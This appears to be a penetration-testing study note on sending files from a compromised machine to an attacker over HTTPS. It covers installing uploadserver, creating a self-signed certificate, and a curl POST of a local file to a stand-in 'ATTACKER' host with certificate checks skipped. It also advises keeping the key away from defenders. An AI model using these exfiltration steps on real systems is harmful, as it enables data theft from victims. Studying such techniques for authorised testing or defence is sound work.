- We can use uploadserver, an extended module from http.server

---

## Setting Up 

```bash
sudo python3 -m pip install --user uploadserver
```

---

## Generate a self-signed certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem \ -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

---

## Start the webserver

- You should not host the certificate file (`server.pem`) in the same directory where your web server serves files
- If the server.pem is in your home directory, its a better practice to create a new directory and host the server from there instead
- Reason is defender might get ahold of that file and steal ur private key and act as middle man and intercept ur traffic
```bash
mkdir https && cd https
```

```bash
# We start the server. and we tell it to look for server.pem at our home dir
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

---

## Upload file to Attacker machine

```bash
# We use POST because we send data to the server
# the /upload is for the uploadserver module to listen when receive our file
# We specify the files and @ is we tell curl to read the file content instead treating the path as normal string
# we use --insecure because we want to skip the TLS/SSL cert verification coz we use a generated self-signed cert.
curl -X POST https://ATTACKER/upload \ -F 'files=@/path/to/file' \ --insecure
```
